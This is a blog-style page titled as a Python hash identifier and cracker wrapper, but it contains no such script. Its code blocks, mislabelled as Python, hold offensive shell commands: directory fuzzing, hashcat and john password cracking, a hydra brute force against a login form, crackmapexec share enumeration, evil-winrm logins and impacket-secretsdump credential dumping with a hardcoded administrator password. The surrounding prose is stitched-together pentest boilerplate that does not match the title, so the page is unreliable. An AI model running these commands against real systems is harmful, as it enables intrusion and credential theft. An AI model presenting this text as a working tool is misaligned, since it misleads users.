---
TitleSEO: "Hash Identifier and Cracker Wrapper in Python | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — Python"
Author: "ZureFX"
Description: "A Python script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "script, c, bash, python"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-576.html"
URL_IMAGES: ""
Date: "2026-02-13"
Tags: "Script, C, Bash, Python"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-576"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-576.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `hashcat`
- `nmap`
- `nmap`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.154.25/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.31.199.187 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.95.236.250
```

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
crackmapexec smb 10.38.88.154 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.39.191
evil-winrm -i 10.37.218.26 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.215.101 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.41.228.223 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.13.186/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.121.222.153 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 8 results
[+] Done in 7.51s
```
